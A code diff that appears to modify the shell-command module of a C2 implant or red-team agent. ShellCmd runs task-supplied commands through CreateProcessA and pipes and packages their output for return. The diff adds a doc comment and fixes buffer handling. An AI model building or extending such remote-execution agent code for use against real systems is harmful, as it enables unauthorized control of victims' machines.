@@ -7,6 +7,14 @@
 #include "Config.h"
 
 #ifdef INCLUDE_CMD_SHELL
+
+/**
+ * @brief Execute a shell command using CreateProcessA and return the output.
+ * 
+ * @param[in] taskUuid Task's UUID
+ * @param[inout] arguments PARSER struct containing task data.
+ * @return VOID
+ */
 VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
 {
     UINT32 nbArg = ParserGetInt32(arguments);
@@ -30,7 +38,7 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
     DWORD bytesRead         = 0;
     DWORD bytesAvailable    = 0;
     CHAR cmdLine[8192]      = { 0 };
-    CHAR buffer[4096];
+    CHAR buffer[4096]       = { 0 };
 
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
     sa.bInheritHandle = TRUE;
@@ -109,7 +117,7 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
                 {
                     if (bytesRead > 0)
                     {
-                        PackageAddString(temp, buffer, FALSE);
+                        PackageAddBytes(temp, (PBYTE)buffer, bytesRead, FALSE);
                     }
                 }
                 
@@ -149,7 +157,7 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
             {
                 if ( ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0 )
                 {
-                    PackageAddString(temp, buffer, FALSE);
+                    PackageAddBytes(temp, (PBYTE)buffer, bytesRead, FALSE);
                 }
                 break;
             }
@@ -164,7 +172,7 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
         {
             if ( ReadFile(hStdErrRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
             {
-                PackageAddString(temp, buffer, FALSE);
+                PackageAddBytes(temp, (PBYTE)buffer, bytesRead, FALSE);
             }
             bytesAvailable = 0;
             PeekNamedPipe(hStdErrRead, NULL, 0, NULL, &bytesAvailable, NULL);
